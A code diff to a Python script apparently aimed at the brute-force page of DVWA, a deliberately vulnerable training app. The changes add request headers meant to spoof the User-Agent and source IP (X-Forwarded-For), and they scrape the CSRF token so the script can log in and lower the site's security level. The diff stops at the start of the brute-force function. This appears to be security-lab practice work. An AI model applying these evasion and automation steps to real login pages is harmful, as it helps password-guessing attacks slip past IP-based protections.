@@ -1,3 +1,4 @@
+from bs4 import BeautifulSoup
 import requests
 import sys
 import time
@@ -5,7 +6,6 @@ import json
 from datetime import datetime
 from pathlib import Path
 import os
-from bs4 import BeautifulSoup
 
 # Setup directories and session
 logs_dir = Path('logs')
@@ -29,6 +29,12 @@ target_url = f"{base_url}/vulnerabilities/brute/"
 login_url = f"{base_url}/login.php"
 security_url = f"{base_url}/security.php"
 
+# Headers to spoof User-Agent and IP address
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+    'X-Forwarded-For': '192.168.1.1'
+}
+
 def login_and_setup_security():
     #response = session.get(login_url)
     data = {
@@ -36,17 +42,18 @@ def login_and_setup_security():
         'password': 'password',
         'Login': 'Login',
     }
-    session.post(login_url, data=data)
+    response = session.post(login_url, data=data, headers=headers)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
     time.sleep(delay) 
     
     #response = session.get(security_url)
-    security_token = 'b33ea9835a4b1a8c442c4bb9df199a53'  # Add logic to extract security token
     data = {
         'security': 'low',
         'seclev_submit': 'Submit',
-        'user_token': security_token
+        'user_token': user_token
     }
-    session.post(security_url, data=data)
+    session.post(security_url, data=data, headers=headers)
     time.sleep(delay) 
 
 def brute_force_attack():
